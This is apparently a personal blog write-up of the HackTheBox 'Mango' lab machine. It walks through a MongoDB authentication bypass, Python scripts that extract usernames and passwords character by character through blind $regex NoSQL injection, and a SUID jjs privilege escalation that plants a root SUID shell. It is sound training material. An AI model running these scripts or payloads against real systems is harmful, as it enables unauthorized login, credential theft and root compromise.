---
title: "HTB Mango Walkthrough"
date: "2025-04-22"

layout: ../../layouts/PostLayout.astro
description: "Detail walkthrough on hackthebox machine mango."

img_path : "/images/mango/theme.png"
img_alt: "web image"
---

## Title: Mongo

## About Mongo

Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials. We can use one set of credentials to gain a foothold using SSH, and the other to move laterally within the box. A SUID binary is then exploited to escalate our privileges to root. 

---

## 1. The Process

### Enumeration

Let’s start enumerating the host with nmap.

```bash
nmap -sC -sV 10.10.10.162
```

![image.png](/images/mango/image1.png)

Nmap scan has reveal that 3 tcp port are open, that is ssh on port 22 running Ubuntu, http on port 80 running Apache httpd and https on port 443 running Apache httpd.

On port 443, it leaks the subdomain name that is “staging-order.mango.htb”.

Let's add mango.htb and staging-order.mango.htb to /etc/hosts , and proceed with our enumeration.

```bash
sudo nano /etc/hosts
```

![image.png](/images/mango/image2.png)
Let’s check the website, since port 80 is open.

![image.png](/images/mango/image3.png)
As we have already seen in the nmap result that “http-title: 403 Forbidden”. So let’s go with the port 443 which is https.

![image.png](/images/mango/image4.png)
It is a search engine. When I tried searching, it didn’t return anything. The page just refreshes.

But the subdomain that we found in nmap gives us the login page on http website.

![image.png](/images/mango/image5.png)
Let’s intercept the request using Burp and examine the login request.

From the machine info, we found that the machine is vulnerable to NoSQL injection. So let's try a NoSQL injection attack such as a MongoDB authentication bypass, MongoDB uses the $ne (not equal) operator to compare values. 

```
username=admin&password[$ne]=tshering&login=login
```

Sending a request with the parameter password[$ne]=tshering would result in the query:

```sql
db.users.find({ username: "admin", password: { $ne : "admin" } });
```

This returns true because the password for admin is not equal to admin, which bypasses the
login successfully.

![image.png](/images/mango/image6.png)
It returns the location home.php, so I forward the request and we are redirect to home.php

![image.png](/images/mango/image7.png)
The website is currently under Under plantation. The page doesn’t give any information. There is no other directories also. Now I got struck so i checked the walkthrough. 

It is given that we can attempt to exfiltrate data from the Mongo database using the $regex operator. The $regex operator can be used to find data using regular expressions. 

For example, the following query will search for usernames matching the regex a.* , which matches any username containing an a .

```sql
db.users.find({ username: { $regex : "a.*", password: { $ne : "admin" } });
```

![image.png](/images/mango/image8.png)
In the response it return 302 found which means there is a username that contain letter a in it. With this logic, I am going to write a python code to find all the letter of username.

### Exploitation

```python
from requests import post
from string import ascii_lowercase

url = 'http://staging-order.mango.htb/'

def sendPayload():    
	for char in ascii_lowercase:        
		regex = '{}.*'.format(char)        
		data = {             
				'username[$regex]': regex,             
				'password[$ne]': 'password',             
				'login': 'login'         
		}        
		response = post(url, data=data, allow_redirects=False)        
		if response.status_code == 302:            
				print("Found valid letter: {}".format(char))
def getUser():    
	sendPayload()
if __name__ == '__main__':    
	getUser()

```

This is the python code. It will list all letters present in all the usernames in the DB.

![image.png](/images/mango/image9.png)
The pyhton code has found the 7 valid letters i.e ‘a’, ‘d’, ‘g’, ‘i’, ‘m’, ‘n’, ‘o’. Now we have all the valid letter, the next step is to find the actual username from that valid letters. First we need to find the starting letter of the username. For that also I will write a python code.

```python
from requests import post
from string import ascii_lowercase

url = 'http://staging-order.mango.htb/'
valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']

def sendPayload(word):
    regex = '^{}.*'.format(word)
    data = {
        'username[$regex]': regex,
        'password[$ne]': 'password',
        'login': 'login'
    }
    response = post(url, data=data, allow_redirects=False)
    if response.status_code == 302:
        return word
    else:
        return None

def getUser():
    for char in valid:
        if sendPayload(char) is not None:
            print("Found username starting with {}".format(char))

if __name__ == '__main__':
    getUser()
```

The caret symbol ^ in regex is used to mark the beginning of a word. For example, the pattern ^a.* will return true only if the username starts with an a . Similarly, the pattern ^ad.* returns true if a username starting with ad exists and so on. The script loops through the character set to find usernames beginning with any one of those letters.

![image.png](/images/mango/image10.png)
There are 2 username one beginning with letter a and other that begin with letter m. With these information, now let’s write a python code to get the actual username. 

```python
from requests import post
from string import ascii_lowercase

url = 'http://staging-order.mango.htb/'
valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']

def sendPayload(word):
    for char in valid:
        regex = '^{}{}.*'.format(word, char)
        data = {
            'username[$regex]': regex,
            'password[$ne]': 'password',
            'login': 'login'
        }
        response = post(url, data=data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None

def getUser():
    for ch in ['a', 'm']:
        username = ch
        while True:
            char = sendPayload(username)
            if char is not None:
                username += char
            else:
                print("Username found: {}".format(username))
                break

if __name__ == '__main__':
    getUser()
```

![image.png](/images/mango/image11.png)
We found the 2 username “admin” and “mango”.  Now using this 2 username we can write a python code to find their passwords. The logic goes same, i.e first find the valid character and then the actual password.

Let’s write a python code to find a valid character.

```python
from requests import post
from string import printable

url = 'http://staging-order.mango.htb/'

def sendPayload(user):
    valid = []
    for char in printable:
        regex = '{}.*'.format(char)
        data = {
            'username': user,
            'password[$regex]': regex,
            'login': 'login'
        }
        response = post(url, data=data, allow_redirects=False)
        if response.status_code == 302:
            valid.append(char)
    return valid

def getUser():
    for user in ['admin', 'mango']:
        valid_chars = sendPayload(user)
        print("Valid characters for {}: {}".format(user, valid_chars))

if __name__ == '__main__':
    getUser()
```

![image.png](/images/mango/image12.png)
We got the valid character for the password of 2 user. Now let’s update the code to get the actual password.

```python
from requests import post
from string import printable

url = 'http://staging-order.mango.htb/'

admin_pass = ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '\\$', '\\.', '>', '\\\\', '\\^', '\\|']
mango_pass = ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '\\$', '\\.', '\\\\', ']', '\\^', '{', '\\|', '~']

def sendPayload(user, word):
    valid = admin_pass if user == 'admin' else mango_pass
    for char in valid:
        regex = '^{}{}.*'.format(word, char)
        data = {
            'username': user,
            'password[$regex]': regex,
            'login': 'login'
        }
        response = post(url, data=data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None

def getUser():
    for user in ['admin', 'mango']:
        password = ''
        while True:
            char = sendPayload(user, password)
            if char is not None:
                password += char
            else:
                print("Password for {} found: {}".format(user, password))
                break

if __name__ == '__main__':
    getUser()
```

The code uses valid character sets for both users and reveals their password character by
character.

![image.png](/images/mango/image13.png)
Now we got the users password. now lets login to ssh.

![image.png](/images/mango/image14.png)
When logging in to ssh as admin, it says permission denied.

![image.png](/images/mango/image15.png)
There is nothing in user mango but in home directory there is admin folder.

![image.png](/images/mango/image16.png)
Inside the admin directory there is a user flag.

![image.png](/images/mango/image17.png)
But mango doesn’t has the permission. So we need to change to user admin.

### user flag

![image.png](/images/mango/image18.png)
Boom….we got the user flag. 

### Privilege Escalation

Search for the SUID files.

![image.png](/images/mango/image19.png)
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs is the path to the Java Binary with the SetUID Permission bit set. The jjs utility can be used to execute commands as root.

Inside that file run the following java code.

```java
Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
```

The command above will copy /bin/sh to /tmp and make it an SUID.

![image.png](/images/mango/image20.png)
Boom…we are in root shell.

### root flag

![image.png](/images/mango/image21.png)
And finally we got the root flag.

## 2. Learning

- NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:
    - Bypass authentication or protection mechanisms.
    - Extract or edit data.
    - Cause a denial of service.
    - Execute code on the server.
- NoSQL databases often use query operators, which provide ways to 
specify conditions that data must meet to be included in the query 
result. Examples of MongoDB query operators include:
    - `$where` - Matches documents that satisfy a JavaScript expression.
    - `$ne` - Matches all values that are not equal to a specified value.
    - `$in` - Matches all of the values specified in an array.
    - `$regex` - Selects documents where values match a specified regular expression.
- I got new knowledge about burp suite, that is the functionality of Forward button. The "Forward" button in the Proxy Intercept tab sends an intercepted HTTP request to the target server.
- I have learned how to use python for username and password enumeration.
- SUID (the special permission for the user access level), a file with SUID always executes as the user who owns the file, regardless of the user passing the command.

## 3. Reference List

[Mango.pdf](/images/mango/Mango.pdf)

[NoSQL](https://portswigger.net/web-security/nosql-injection)